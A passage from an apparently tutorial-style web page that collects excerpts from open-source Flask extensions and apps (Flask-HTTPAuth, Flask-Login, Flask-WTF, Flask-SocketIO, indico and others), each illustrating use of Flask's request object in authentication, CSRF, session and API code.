            roles = role
        else:
            roles = [role]
        if user is True:
            user = auth
        if self.get_user_roles_callback is None:  # pragma: no cover


## ... source file abbreviated to get to request examples ...


        if user_roles is None:
            user_roles = {}
        elif not isinstance(user_roles, (list, tuple)):
            user_roles = {user_roles}
        else:
            user_roles = set(user_roles)
        for role in roles:
            if isinstance(role, (list, tuple)):
                role = set(role)
                if role & user_roles == role:
                    return True
            elif role in user_roles:
                return True

    def login_required(self, f=None, role=None, optional=None):
        if f is not None and \
                (role is not None or optional is not None):  # pragma: no cover
            raise ValueError(
                'role and optional are the only supported arguments')

        def login_required_internal(f):
            @wraps(f)
            def decorated(*args, **kwargs):
                auth = self.get_auth()

~~                if request.method != 'OPTIONS':  # pragma: no cover
                    password = self.get_auth_password(auth)

                    status = None
                    user = self.authenticate(auth, password)
                    if user in (False, None):
                        status = 401
                    elif not self.authorize(role, user, auth):
                        status = 403
                    if not optional and status:
~~                        request.data
                        try:
                            return self.auth_error_callback(status)
                        except TypeError:
                            return self.auth_error_callback()

                    g.flask_httpauth_user = user if user is not True \
                        else auth.username if auth else None
                return f(*args, **kwargs)
            return decorated

        if f:
            return login_required_internal(f)
        return login_required_internal

    def username(self):
~~        if not request.authorization:
            return ""
~~        return request.authorization.username

    def current_user(self):
        if hasattr(g, 'flask_httpauth_user'):
            return g.flask_httpauth_user


class HTTPBasicAuth(HTTPAuth):
    def __init__(self, scheme=None, realm=None):
        super(HTTPBasicAuth, self).__init__(scheme or 'Basic', realm)

        self.hash_password_callback = None
        self.verify_password_callback = None

    def hash_password(self, f):
        self.hash_password_callback = f
        return f

    def verify_password(self, f):
        self.verify_password_callback = f
        return f

    def get_auth(self):
        header = self.header or 'Authorization'
~~        if header not in request.headers:
            return None
~~        value = request.headers[header].encode('utf-8')
        try:
            scheme, credentials = value.split(b' ', 1)
            username, password = b64decode(credentials).split(b':', 1)
        except (ValueError, TypeError):
            return None
        return Authorization(
            scheme, {'username': username.decode('utf-8'),
                     'password': password.decode('utf-8')})

    def authenticate(self, auth, stored_password):
        if auth:
            username = auth.username
            client_password = auth.password
        else:
            username = ""
            client_password = ""
        if self.verify_password_callback:
            return self.verify_password_callback(username, client_password)
        if not auth:
            return
        if self.hash_password_callback:
            try:
                client_password = self.hash_password_callback(client_password)
            except TypeError:


## ... source file abbreviated to get to request examples ...


        a1 = username + ":" + self.realm + ":" + password
        a1 = a1.encode('utf-8')
        return md5(a1).hexdigest()

    def authenticate_header(self):
        nonce = self.get_nonce()
        opaque = self.get_opaque()
        return '{0} realm="{1}",nonce="{2}",opaque="{3}"'.format(
            self.scheme, self.realm, nonce,
            opaque)

    def authenticate(self, auth, stored_password_or_ha1):
        if not auth or not auth.username or not auth.realm or not auth.uri \
                or not auth.nonce or not auth.response \
                or not stored_password_or_ha1:
            return False
        if not(self.verify_nonce_callback(auth.nonce)) or \
                not(self.verify_opaque_callback(auth.opaque)):
            return False
        if self.use_ha1_pw:
            ha1 = stored_password_or_ha1
        else:
            a1 = auth.username + ":" + auth.realm + ":" + \
                stored_password_or_ha1
            ha1 = md5(a1.encode('utf-8')).hexdigest()
~~        a2 = request.method + ":" + auth.uri
        ha2 = md5(a2.encode('utf-8')).hexdigest()
        a3 = ha1 + ":" + auth.nonce + ":" + ha2
        response = md5(a3.encode('utf-8')).hexdigest()
        return safe_str_cmp(response, auth.response)


class HTTPTokenAuth(HTTPAuth):
    def __init__(self, scheme='Bearer', realm=None, header=None):
        super(HTTPTokenAuth, self).__init__(scheme, realm, header)

        self.verify_token_callback = None

    def verify_token(self, f):
        self.verify_token_callback = f
        return f

    def authenticate(self, auth, stored_password):
        if auth:
            token = auth['token']
        else:
            token = ""
        if self.verify_token_callback:
            return self.verify_token_callback(token)


class MultiAuth(object):
    def __init__(self, main_auth, *args):
        self.main_auth = main_auth
        self.additional_auth = args

    def login_required(self, f=None, role=None):
        if f is not None and role is not None:  # pragma: no cover
            raise ValueError('role is the only supported argument')

        def login_required_internal(f):
            @wraps(f)
            def decorated(*args, **kwargs):
                selected_auth = None
~~                if 'Authorization' in request.headers:
                    try:
~~                        scheme, creds = request.headers[
                            'Authorization'].split(None, 1)
                    except ValueError:
                        pass
                    else:
                        for auth in self.additional_auth:
                            if auth.scheme == scheme:
                                selected_auth = auth
                                break
                if selected_auth is None:
                    selected_auth = self.main_auth
                return selected_auth.login_required(role=role)(f)(
                    *args, **kwargs)
            return decorated

        if f:
            return login_required_internal(f)
        return login_required_internal

    def current_user(self):
        if hasattr(g, 'flask_httpauth_user'):  # pragma: no cover
            return g.flask_httpauth_user



## ... source file continues with no further request examples...

```


## Example 10 from flask-login
[Flask-Login](https://github.com/maxcountryman/flask-login)
([project documentation](https://flask-login.readthedocs.io/en/latest/)
and [PyPI package](https://pypi.org/project/Flask-Login/))
is a [Flask](/flask.html) extension that provides user session
management, which handles common tasks such as logging in
and out of a [web application](/web-development.html) and
managing associated user session data. Flask-Login is
open sourced under the
[MIT license](https://github.com/maxcountryman/flask-login/blob/master/LICENSE).

[**flask-login / flask_login / utils.py**](https://github.com/maxcountryman/flask-login/blob/master/flask_login/./utils.py)

```python
# utils.py


import hmac
from hashlib import sha512
from functools import wraps
from werkzeug.local import LocalProxy
from werkzeug.security import safe_str_cmp
from werkzeug.urls import url_decode, url_encode

~~from flask import (_request_ctx_stack, current_app, request, session, url_for,
                   has_request_context)

from ._compat import text_type, urlparse, urlunparse
from .config import COOKIE_NAME, EXEMPT_METHODS
from .signals import user_logged_in, user_logged_out, user_login_confirmed


current_user = LocalProxy(lambda: _get_user())


def encode_cookie(payload, key=None):
    return u'{0}|{1}'.format(payload, _cookie_digest(payload, key=key))


def decode_cookie(cookie, key=None):
    try:
        payload, digest = cookie.rsplit(u'|', 1)
        if hasattr(digest, 'decode'):
            digest = digest.decode('ascii')  # pragma: no cover
    except ValueError:
        return

    if safe_str_cmp(_cookie_digest(payload, key=key), digest):
        return payload


def make_next_param(login_url, current_url):
    l_url = urlparse(login_url)
    c_url = urlparse(current_url)

    if (not l_url.scheme or l_url.scheme == c_url.scheme) and \
            (not l_url.netloc or l_url.netloc == c_url.netloc):
        return urlunparse(('', '', c_url.path, c_url.params, c_url.query, ''))
    return current_url


def expand_login_view(login_view):
    if login_view.startswith(('https://', 'http://', '/')):
        return login_view
    else:
~~        if request.view_args is None:
            return url_for(login_view)
        else:
            return url_for(login_view, **request.view_args)


def login_url(login_view, next_url=None, next_field='next'):
    base = expand_login_view(login_view)

    if next_url is None:
        return base

    parsed_result = urlparse(base)
    md = url_decode(parsed_result.query)
    md[next_field] = make_next_param(base, next_url)
    netloc = current_app.config.get('FORCE_HOST_FOR_REDIRECTS') or \
        parsed_result.netloc
    parsed_result = parsed_result._replace(netloc=netloc,
                                           query=url_encode(md, sort=True))
    return urlunparse(parsed_result)


def login_fresh():
    return session.get('_fresh', False)



## ... source file abbreviated to get to request examples ...


                                                 duration.days * 24 * 3600) *
                                                10**6) / 10.0**6
            except AttributeError:
                raise Exception('duration must be a datetime.timedelta, '
                                'instead got: {0}'.format(duration))

    current_app.login_manager._update_request_context_with_user(user)
    user_logged_in.send(current_app._get_current_object(), user=_get_user())
    return True


def logout_user():

    user = _get_user()

    if '_user_id' in session:
        session.pop('_user_id')

    if '_fresh' in session:
        session.pop('_fresh')

    if '_id' in session:
        session.pop('_id')

    cookie_name = current_app.config.get('REMEMBER_COOKIE_NAME', COOKIE_NAME)
~~    if cookie_name in request.cookies:
        session['_remember'] = 'clear'
        if '_remember_seconds' in session:
            session.pop('_remember_seconds')

    user_logged_out.send(current_app._get_current_object(), user=user)

    current_app.login_manager._update_request_context_with_user()
    return True


def confirm_login():
    session['_fresh'] = True
    session['_id'] = current_app.login_manager._session_identifier_generator()
    user_login_confirmed.send(current_app._get_current_object())


def login_required(func):
    @wraps(func)
    def decorated_view(*args, **kwargs):
~~        if request.method in EXEMPT_METHODS:
            return func(*args, **kwargs)
        elif current_app.config.get('LOGIN_DISABLED'):
            return func(*args, **kwargs)
        elif not current_user.is_authenticated:
            return current_app.login_manager.unauthorized()
        return func(*args, **kwargs)
    return decorated_view


def fresh_login_required(func):
    @wraps(func)
    def decorated_view(*args, **kwargs):
~~        if request.method in EXEMPT_METHODS:
            return func(*args, **kwargs)
        elif current_app.config.get('LOGIN_DISABLED'):
            return func(*args, **kwargs)
        elif not current_user.is_authenticated:
            return current_app.login_manager.unauthorized()
        elif not login_fresh():
            return current_app.login_manager.needs_refresh()
        return func(*args, **kwargs)
    return decorated_view


def set_login_view(login_view, blueprint=None):

    num_login_views = len(current_app.login_manager.blueprint_login_views)
    if blueprint is not None or num_login_views != 0:

        (current_app.login_manager
            .blueprint_login_views[blueprint.name]) = login_view

        if (current_app.login_manager.login_view is not None and
                None not in current_app.login_manager.blueprint_login_views):

            (current_app.login_manager
                .blueprint_login_views[None]) = (current_app.login_manager
                                                 .login_view)

        current_app.login_manager.login_view = None
    else:
        current_app.login_manager.login_view = login_view


def _get_user():
    if has_request_context() and not hasattr(_request_ctx_stack.top, 'user'):
        current_app.login_manager._load_user()

    return getattr(_request_ctx_stack.top, 'user', None)


def _cookie_digest(payload, key=None):
    key = _secret_key(key)

    return hmac.new(key, payload.encode('utf-8'), sha512).hexdigest()


def _get_remote_addr():
~~    address = request.headers.get('X-Forwarded-For', request.remote_addr)
    if address is not None:
        address = address.encode('utf-8').split(b',')[0].strip()
    return address


def _create_identifier():
~~    user_agent = request.headers.get('User-Agent')
    if user_agent is not None:
        user_agent = user_agent.encode('utf-8')
    base = '{0}|{1}'.format(_get_remote_addr(), user_agent)
    if str is bytes:
        base = text_type(base, 'utf-8', errors='replace')  # pragma: no cover
    h = sha512()
    h.update(base.encode('utf8'))
    return h.hexdigest()


def _user_context_processor():
    return dict(current_user=_get_user())


def _secret_key(key=None):
    if key is None:
        key = current_app.config['SECRET_KEY']

    if isinstance(key, text_type):  # pragma: no cover
        key = key.encode('latin1')  # ensure bytes

    return key



## ... source file continues with no further request examples...

```


## Example 11 from flask-restx
[Flask RESTX](https://github.com/python-restx/flask-restx) is an
extension that makes it easier to build
[RESTful APIs](/application-programming-interfaces.html) into
your applications. Flask RESTX aims for minimal configuration to
get basic APIs running for existing applications and it exposes
endpoint documentation using [Swagger](https://swagger.io/).

Flask RESTX is provided as open source under the
[BSD  3-Clause license](https://github.com/python-restx/flask-restx/blob/master/LICENSE).

[**flask-restx / flask_restx / marshalling.py**](https://github.com/python-restx/flask-restx/blob/master/flask_restx/./marshalling.py)

```python
# marshalling.py
from __future__ import unicode_literals

from collections import OrderedDict
from functools import wraps
from six import iteritems

~~from flask import request, current_app, has_app_context

from .mask import Mask, apply as apply_mask
from .utils import unpack


def make(cls):
    if isinstance(cls, type):
        return cls()
    return cls


def marshal(data, fields, envelope=None, skip_none=False, mask=None, ordered=False):
    out, has_wildcards = _marshal(data, fields, envelope, skip_none, mask, ordered)

    if has_wildcards:
        from .fields import Wildcard

        items = []
        keys = []
        for dkey, val in fields.items():
            key = dkey
            if isinstance(val, dict):
                value = marshal(data, val, skip_none=skip_none, ordered=ordered)
            else:


## ... source file abbreviated to get to request examples ...



    if envelope:
        out = OrderedDict([(envelope, out)]) if ordered else {envelope: out}

    return out, has_wildcards["present"]


class marshal_with(object):

    def __init__(
        self, fields, envelope=None, skip_none=False, mask=None, ordered=False
    ):
        self.fields = fields
        self.envelope = envelope
        self.skip_none = skip_none
        self.ordered = ordered
        self.mask = Mask(mask, skip=True)

    def __call__(self, f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            resp = f(*args, **kwargs)
            mask = self.mask
            if has_app_context():
                mask_header = current_app.config["RESTX_MASK_HEADER"]
~~                mask = request.headers.get(mask_header) or mask
            if isinstance(resp, tuple):
                data, code, headers = unpack(resp)
                return (
                    marshal(
                        data,
                        self.fields,
                        self.envelope,
                        self.skip_none,
                        mask,
                        self.ordered,
                    ),
                    code,
                    headers,
                )
            else:
                return marshal(
                    resp, self.fields, self.envelope, self.skip_none, mask, self.ordered
                )

        return wrapper


class marshal_with_field(object):



## ... source file continues with no further request examples...

```


## Example 12 from Flask-WTF
[Flask-WTF](https://github.com/lepture/flask-wtf)
([project documentation](https://flask-wtf.readthedocs.io/en/stable/)
and
[PyPI page](https://pypi.org/project/Flask-WTF/))
provides a bridge between [Flask](/flask.html) and the the
[WTForms](https://wtforms.readthedocs.io/en/2.3.x/) form-handling library.
It makes it easier to use WTForms by reducing boilerplate code and
shorter examples for common form operations as well as common security
practices such as [CSRF](/cross-site-request-forgery-csrf.html).

[**Flask-WTF / flask_wtf / csrf.py**](https://github.com/lepture/flask-wtf/blob/master/flask_wtf/./csrf.py)

```python
# csrf.py
import hashlib
import logging
import os
import warnings
from urllib.parse import urlparse
from functools import wraps

~~from flask import Blueprint, current_app, g, request, session
from itsdangerous import BadData, SignatureExpired, URLSafeTimedSerializer
from werkzeug.exceptions import BadRequest
from werkzeug.security import safe_str_cmp
from wtforms import ValidationError
from wtforms.csrf.core import CSRF

from ._compat import FlaskWTFDeprecationWarning

__all__ = ('generate_csrf', 'validate_csrf', 'CSRFProtect')
logger = logging.getLogger(__name__)


def generate_csrf(secret_key=None, token_key=None):

    secret_key = _get_config(
        secret_key, 'WTF_CSRF_SECRET_KEY', current_app.secret_key,
        message='A secret key is required to use CSRF.'
    )
    field_name = _get_config(
        token_key, 'WTF_CSRF_FIELD_NAME', 'csrf_token',
        message='A field name is required to use CSRF.'
    )

    if field_name not in g:


## ... source file abbreviated to get to request examples ...


        app.extensions['csrf'] = self

        app.config.setdefault('WTF_CSRF_ENABLED', True)
        app.config.setdefault('WTF_CSRF_CHECK_DEFAULT', True)
        app.config['WTF_CSRF_METHODS'] = set(app.config.get(
            'WTF_CSRF_METHODS', ['POST', 'PUT', 'PATCH', 'DELETE']
        ))
        app.config.setdefault('WTF_CSRF_FIELD_NAME', 'csrf_token')
        app.config.setdefault(
            'WTF_CSRF_HEADERS', ['X-CSRFToken', 'X-CSRF-Token']
        )
        app.config.setdefault('WTF_CSRF_TIME_LIMIT', 3600)
        app.config.setdefault('WTF_CSRF_SSL_STRICT', True)

        app.jinja_env.globals['csrf_token'] = generate_csrf
        app.context_processor(lambda: {'csrf_token': generate_csrf})

        @app.before_request
        def csrf_protect():
            if not app.config['WTF_CSRF_ENABLED']:
                return

            if not app.config['WTF_CSRF_CHECK_DEFAULT']:
                return

~~            if request.method not in app.config['WTF_CSRF_METHODS']:
                return

~~            if not request.endpoint:
                return

~~            if request.blueprint in self._exempt_blueprints:
                return

            view = app.view_functions.get(request.endpoint)
            dest = f'{view.__module__}.{view.__name__}'

            if dest in self._exempt_views:
                return

            self.protect()

    def _get_csrf_token(self):
        field_name = current_app.config['WTF_CSRF_FIELD_NAME']
~~        base_token = request.form.get(field_name)

        if base_token:
            return base_token

~~        for key in request.form:
            if key.endswith(field_name):
~~                csrf_token = request.form[key]

                if csrf_token:
                    return csrf_token

        for header_name in current_app.config['WTF_CSRF_HEADERS']:
~~            csrf_token = request.headers.get(header_name)

            if csrf_token:
                return csrf_token

        return None

    def protect(self):
~~        if request.method not in current_app.config['WTF_CSRF_METHODS']:
            return

        try:
            validate_csrf(self._get_csrf_token())
        except ValidationError as e:
            logger.info(e.args[0])
            self._error_response(e.args[0])

~~        if request.is_secure and current_app.config['WTF_CSRF_SSL_STRICT']:
~~            if not request.referrer:
                self._error_response('The referrer header is missing.')

            good_referrer = f'https://{request.host}/'

            if not same_origin(request.referrer, good_referrer):
                self._error_response('The referrer does not match the host.')

        g.csrf_valid = True  # mark this request as CSRF valid

    def exempt(self, view):

        if isinstance(view, Blueprint):
            self._exempt_blueprints.add(view.name)
            return view

        if isinstance(view, str):
            view_location = view
        else:
            view_location = '.'.join((view.__module__, view.__name__))

        self._exempt_views.add(view_location)
        return view

    def _error_response(self, reason):


## ... source file continues with no further request examples...

```


## Example 13 from flaskSaaS
[flaskSaas](https://github.com/alectrocute/flaskSaaS) is a boilerplate
starter project to build a software-as-a-service (SaaS) web application
in [Flask](/flask.html), with [Stripe](/stripe.html) for billing. The
boilerplate relies on many common Flask extensions such as
[Flask-WTF](https://flask-wtf.readthedocs.io/en/latest/),
[Flask-Login](https://flask-login.readthedocs.io/en/latest/),
[Flask-Admin](https://flask-admin.readthedocs.io/en/latest/), and
many others. The project is provided as open source under the
[MIT license](https://github.com/alectrocute/flaskSaaS/blob/master/LICENSE).

[**flaskSaaS / app / admin.py**](https://github.com/alectrocute/flaskSaaS/blob/master/app/./admin.py)

```python
# admin.py
import os.path as op

~~from flask import request, Response
from werkzeug.exceptions import HTTPException
from flask_admin import Admin
from flask.ext.admin.contrib.sqla import ModelView
from flask.ext.admin.contrib.fileadmin import FileAdmin

from app import app, db
from app.models import User


admin = Admin(app, name='Admin', template_mode='bootstrap3')

class ModelView(ModelView):

    def is_accessible(self):
~~        auth = request.authorization or request.environ.get('REMOTE_USER')  # workaround for Apache
        if not auth or (auth.username, auth.password) != app.config['ADMIN_CREDENTIALS']:
            raise HTTPException('', Response('You have to an administrator.', 401,
                {'WWW-Authenticate': 'Basic realm="Login Required"'}
            ))
        return True

admin.add_view(ModelView(User, db.session))

path = op.join(op.dirname(__file__), 'static')
admin.add_view(FileAdmin(path, '/static/', name='Static'))



## ... source file continues with no further request examples...

```


## Example 14 from Flask-Security-Too
[Flask-Security-Too](https://github.com/Flask-Middleware/flask-security/)
([PyPi page](https://pypi.org/project/Flask-Security-Too/) and
[project documentation](https://flask-security-too.readthedocs.io/en/stable/))
is a maintained fork of the original
[Flask-Security](https://github.com/mattupstate/flask-security) project that
makes it easier to add common security features to [Flask](/flask.html)
web applications. A few of the critical goals of the Flask-Security-Too
project are ensuring JavaScript client-based single-page applications (SPAs)
can work securely with Flask-based backends and that guidance by the
[OWASP](https://owasp.org/) organization is followed by default.

The Flask-Security-Too project is provided as open source under the
[MIT license](https://github.com/Flask-Middleware/flask-security/blob/master/LICENSE).

[**Flask-Security-Too / flask_security / forms.py**](https://github.com/Flask-Middleware/flask-security/blob/master/flask_security/./forms.py)

```python
# forms.py

import inspect

~~from flask import Markup, current_app, request
from flask_login import current_user
from flask_wtf import FlaskForm as BaseForm
from werkzeug.local import LocalProxy
from wtforms import (
    BooleanField,
    Field,
    HiddenField,
    PasswordField,
    RadioField,
    StringField,
    SubmitField,
    ValidationError,
    validators,
)

from .babel import is_lazy_string, make_lazy_string
from .confirmable import requires_confirmation
from .utils import (
    _,
    _datastore,
    config_value,
    do_flash,
    find_user,
    get_identity_attribute,


## ... source file abbreviated to get to request examples ...



class RegisterFormMixin:
    submit = SubmitField(get_form_field_label("register"))

    def to_dict(self, only_user):

        def is_field_and_user_attr(member):
            if not isinstance(member, Field):
                return False

            if only_user is True:
                return hasattr(_datastore.user_model, member.name)
            else:
                return True

        fields = inspect.getmembers(self, is_field_and_user_attr)
        return {key: value.data for key, value in fields}


class SendConfirmationForm(Form, UserEmailFormMixin):

    submit = SubmitField(get_form_field_label("send_confirmation"))

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
~~        if request.method == "GET":
~~            self.email.data = request.args.get("email", None)

    def validate(self):
        if not super().validate():
            return False
        if self.user.confirmed_at is not None:
            self.email.errors.append(get_message("ALREADY_CONFIRMED")[0])
            return False
        return True


class ForgotPasswordForm(Form, UserEmailFormMixin):

    submit = SubmitField(get_form_field_label("recover_password"))

    def validate(self):
        if not super().validate():
            return False
        if not self.user.is_active:
            self.email.errors.append(get_message("DISABLED_ACCOUNT")[0])
            return False
        if requires_confirmation(self.user):
            self.email.errors.append(get_message("CONFIRMATION_REQUIRED")[0])
            return False
        return True


## ... source file abbreviated to get to request examples ...



    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def validate(self):
        if not super().validate():
            return False
        if not self.user.is_active:
            self.email.errors.append(get_message("DISABLED_ACCOUNT")[0])
            return False
        return True


class LoginForm(Form, NextFormMixin):

    email = StringField(get_form_field_label("email"), validators=[email_required])
    password = PasswordField(
        get_form_field_label("password"), validators=[password_required]
    )
    remember = BooleanField(get_form_field_label("remember_me"))
    submit = SubmitField(get_form_field_label("login"))

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        if not self.next.data:
~~            self.next.data = request.args.get("next", "")
        self.remember.default = config_value("DEFAULT_REMEMBER_ME")
        if (
            current_app.extensions["security"].recoverable
            and not self.password.description
        ):
            html = Markup(
                '<a href="{url}">{message}</a>'.format(
                    url=url_for_security("forgot_password"),
                    message=get_message("FORGOT_PASSWORD")[0],
                )
            )
            self.password.description = html

    def validate(self):
        if not super().validate():
            return False

        self.user = find_user(self.email.data)

        if self.user is None:
            self.email.errors.append(get_message("USER_DOES_NOT_EXIST")[0])
            hash_password(self.password.data)
            return False
        if not self.user.password:


## ... source file abbreviated to get to request examples ...



class RegisterForm(ConfirmRegisterForm, NextFormMixin):

    password_confirm = PasswordField(
        get_form_field_label("retype_password"),
        validators=[
            EqualTo("password", message="RETYPE_PASSWORD_MISMATCH"),
            validators.Optional(),
        ],
    )

    def validate(self):
        if not super().validate():
            return False
        if not config_value("UNIFIED_SIGNIN"):
            if not self.password_confirm.data or not self.password_confirm.data.strip():
                self.password_confirm.errors.append(
                    get_message("PASSWORD_NOT_PROVIDED")[0]
                )
                return False
        return True

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        if not self.next.data:
~~            self.next.data = request.args.get("next", "")


class ResetPasswordForm(Form, NewPasswordFormMixin, PasswordConfirmFormMixin):

    submit = SubmitField(get_form_field_label("reset_password"))

    def validate(self):
        if not super().validate():
            return False

        pbad = _security._password_validator(
            self.password.data, False, user=current_user
        )
        if pbad:
            self.password.errors.extend(pbad)
            return False
        return True


class ChangePasswordForm(Form, PasswordFormMixin):

    new_password = PasswordField(
        get_form_field_label("new_password"), validators=[password_required]
    )


## ... source file continues with no further request examples...

```


## Example 15 from Flask-SocketIO
[Flask-SocketIO](https://github.com/miguelgrinberg/Flask-SocketIO)
([PyPI package information](https://pypi.org/project/Flask-SocketIO/),
[official tutorial](https://blog.miguelgrinberg.com/post/easy-websockets-with-flask-and-gevent)
and
[project documentation](https://flask-socketio.readthedocs.io/en/latest/))
is a code library by [Miguel Grinberg](https://blog.miguelgrinberg.com/index)
that provides Socket.IO integration for [Flask](/flask.html) applications.
This extension makes it easier to add bi-directional communications on the
web via the [WebSockets](/websockets.html) protocol.

The Flask-SocketIO project is open source under the
[MIT license](https://github.com/miguelgrinberg/Flask-SocketIO/blob/master/LICENSE).

[**Flask-SocketIO / test_socketio.py**](https://github.com/miguelgrinberg/Flask-SocketIO/blob/master/././test_socketio.py)

```python
# test_socketio.py
import json
import unittest
import coverage

cov = coverage.coverage(branch=True)
cov.start()

~~from flask import Flask, session, request, json as flask_json
from flask_socketio import SocketIO, send, emit, join_room, leave_room, \
    Namespace, disconnect

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret'
socketio = SocketIO(app)
disconnected = None


@socketio.on('connect')
def on_connect():
~~    if request.args.get('fail'):
        return False
    send('connected')
    send(json.dumps(request.args.to_dict(flat=False)))
~~    send(json.dumps({h: request.headers[h] for h in request.headers.keys()
                     if h not in ['Host', 'Content-Type', 'Content-Length']}))


@socketio.on('disconnect')
def on_disconnect():
    global disconnected
    disconnected = '/'


@socketio.on('connect', namespace='/test')
def on_connect_test():
    send('connected-test')
    send(json.dumps(request.args.to_dict(flat=False)))
~~    send(json.dumps({h: request.headers[h] for h in request.headers.keys()
                     if h not in ['Host', 'Content-Type', 'Content-Length']}))


@socketio.on('disconnect', namespace='/test')
def on_disconnect_test():
    global disconnected
    disconnected = '/test'


@socketio.on('message')
def on_message(message):
    send(message)
    if message == 'test session':
        session['a'] = 'b'
    if message not in "test noackargs":
        return message


@socketio.on('json')
def on_json(data):
    send(data, json=True, broadcast=True)
    if not data.get('noackargs'):
        return data


@socketio.on('message', namespace='/test')
def on_message_test(message):
    send(message)


@socketio.on('json', namespace='/test')
def on_json_test(data):
    send(data, json=True, namespace='/test')


@socketio.on('my custom event')
def on_custom_event(data):
    emit('my custom response', data)
    if not data.get('noackargs'):
        return data


@socketio.on('other custom event')
@socketio.on('and another custom event')
def get_request_event(data):
    global request_event_data
~~    request_event_data = request.event
    emit('my custom response', data)


def get_request_event2(data):
    global request_event_data
~~    request_event_data = request.event
    emit('my custom response', data)

socketio.on_event('yet another custom event', get_request_event2)


@socketio.on('my custom namespace event', namespace='/test')
def on_custom_event_test(data):
    emit('my custom namespace response', data, namespace='/test')


def on_custom_event_test2(data):
    emit('my custom namespace response', data, namespace='/test')

socketio.on_event('yet another custom namespace event', on_custom_event_test2,
                  namespace='/test')


@socketio.on('my custom broadcast event')
def on_custom_event_broadcast(data):
    emit('my custom response', data, broadcast=True)


@socketio.on('my custom broadcast namespace event', namespace='/test')
def on_custom_event_broadcast_test(data):


## ... source file abbreviated to get to request examples ...


@socketio.on("error testing", namespace='/test')
def raise_error_namespace(data):
    raise AssertionError()


@socketio.on_error_default
def error_handler_default(value):
    if isinstance(value, AssertionError):
        global error_testing_default
        error_testing_default = True
    else:
        raise value
    return value


@socketio.on("error testing", namespace='/unused_namespace')
def raise_error_default(data):
    raise AssertionError()


class MyNamespace(Namespace):
    def on_connect(self):
        send('connected-ns')
        send(json.dumps(request.args.to_dict(flat=False)))
        send(json.dumps(
~~            {h: request.headers[h] for h in request.headers.keys()
             if h not in ['Host', 'Content-Type', 'Content-Length']}))

    def on_disconnect(self):
        global disconnected
        disconnected = '/ns'

    def on_message(self, message):
        send(message)
        if message == 'test session':
            session['a'] = 'b'
        if message not in "test noackargs":
            return message

    def on_json(self, data):
        send(data, json=True, broadcast=True)
        if not data.get('noackargs'):
            return data

    def on_exit(self, data):
        disconnect()

    def on_my_custom_event(self, data):
        emit('my custom response', data)
        if not data.get('noackargs'):
            return data

    def on_other_custom_event(self, data):
        global request_event_data
~~        request_event_data = request.event
        emit('my custom response', data)


socketio.on_namespace(MyNamespace('/ns'))


@app.route('/session')
def session_route():
    session['foo'] = 'bar'
    return ''


class TestSocketIO(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        pass

    @classmethod
    def tearDownClass(cls):
        cov.stop()
        cov.report(include='flask_socketio/*', show_missing=True)

    def setUp(self):
        pass


## ... source file continues with no further request examples...

```


## Example 16 from Flask-User
[Flask-User](https://github.com/lingthio/Flask-User)
([PyPI information](https://pypi.org/project/Flask-User/)
and
[project documentation](https://flask-user.readthedocs.io/en/latest/))
is a [Flask](/flask.html) extension that makes it easier to add
custom user account management and authentication to the projects
you are building. The extension supports persistent data storage
through both [relational databases](/databases.html) and
[MongoDB](/mongodb.html). The project is provided as open source under
the [MIT license](https://github.com/lingthio/Flask-User/blob/master/LICENSE.txt).

[**Flask-User / flask_user / translation_utils.py**](https://github.com/lingthio/Flask-User/blob/master/flask_user/./translation_utils.py)

```python
# translation_utils.py


import os
~~from flask import request

_translations_dir = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'translations')

try:
    from flask_babelex import Domain

    domain_translations = Domain(_translations_dir, domain='flask_user')
except ImportError:
    domain_translations = None

def gettext(string, **variables):
    return domain_translations.gettext(string, **variables) if domain_translations else string % variables

def lazy_gettext(string, **variables):
    return domain_translations.lazy_gettext(string, **variables) if domain_translations else string % variables

def get_language_codes():
    language_codes = []
    for folder in os.listdir(_translations_dir):
        locale_dir = os.path.join(_translations_dir, folder, 'LC_MESSAGES')
        if not os.path.isdir(locale_dir):
            continue
        language_codes.append(folder)
    return language_codes

def init_translations(babel):
    if babel:
        babel._default_domain = domain_translations

        if babel.locale_selector_func is None:
            def get_locale():
                available_language_codes = get_language_codes()
~~                language_code = request.accept_languages.best_match(available_language_codes)
                return language_code

            babel.locale_selector_func = get_locale



## ... source file continues with no further request examples...

```


## Example 17 from Flask-VueJs-Template
[Flask-VueJs-Template](https://github.com/gtalarico/flask-vuejs-template)
([demo site](https://flask-vuejs-template.herokuapp.com/))
is a minimal [Flask](/flask.html) boilerplate starter project that
combines Flask, [Vue.js](https://www.fullstackpython.com/vuejs.html),
and [Flask-RESTPlus](https://flask-restplus.readthedocs.io/en/stable/).
The project provides some sensible defaults that are easy to continue
building on, and the source code is open source under the
[MIT license](https://github.com/gtalarico/flask-vuejs-template/blob/master/LICENSE.md).

[**Flask-VueJs-Template / app / api / security.py**](https://github.com/gtalarico/flask-vuejs-template/blob/master/app/api/security.py)

```python
# security.py
from functools import wraps
~~from flask import request
from flask_restplus import abort


def require_auth(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
~~        if request.headers.get('authorization'):
            return func(*args, **kwargs)
        else:
            return abort(401)
    return wrapper



## ... source file continues with no further request examples...

```


## Example 18 from indico
[indico](https://github.com/indico/indico)
([project website](https://getindico.io/),
[documentation](https://docs.getindico.io/en/stable/installation/)
and [sandbox demo](https://sandbox.getindico.io/))
is a [Flask](/flask.html)-based web app for event management.
The code is open sourced under the
[MIT license](https://github.com/indico/indico/blob/master/LICENSE).

[**indico / indico / core / auth.py**](https://github.com/indico/indico/blob/master/indico/core/auth.py)

```python
# auth.py

from __future__ import unicode_literals

~~from flask import current_app, request
from flask_multipass import InvalidCredentials, Multipass, NoSuchUser

from indico.core.logger import Logger


logger = Logger.get('auth')


class IndicoMultipass(Multipass):
    @property
    def default_local_auth_provider(self):
        return next((p for p in self.auth_providers.itervalues() if not p.is_external and p.settings.get('default')),
                    None)

    @property
    def sync_provider(self):
        return next((p for p in self.identity_providers.itervalues() if p.settings.get('synced_fields')), None)

    @property
    def synced_fields(self):
        provider = self.sync_provider
        if provider is None:
            return set()
        synced_fields = set(provider.settings.get('synced_fields'))


## ... source file abbreviated to get to request examples ...


            self._check_default_provider()

    def _check_default_provider(self):
